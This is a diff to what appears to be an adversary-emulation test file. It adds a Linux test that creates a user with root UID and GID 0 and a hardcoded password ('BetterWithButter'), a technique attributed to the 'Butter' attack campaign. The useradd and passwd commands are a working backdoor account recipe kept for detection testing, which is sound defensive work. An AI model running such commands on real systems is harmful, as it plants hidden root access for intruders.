@@ -77,3 +77,23 @@ atomic_tests:
       New-LocalUser -Name #{username} -NoPassword
       net user /add #{username}
 
+
+- name: Create a new user in Linux with `root` UID and GID.
+  description: |
+    Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
+  supported_platforms:
+    - linux
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: String
+      default: butter
+    password:
+      description: Password of the user to create
+      type: String
+      default: BetterWithButter
+  executor:
+    name: bash
+    command: |
+      useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
+      echo "#{password}" | passwd --stdin #{username}
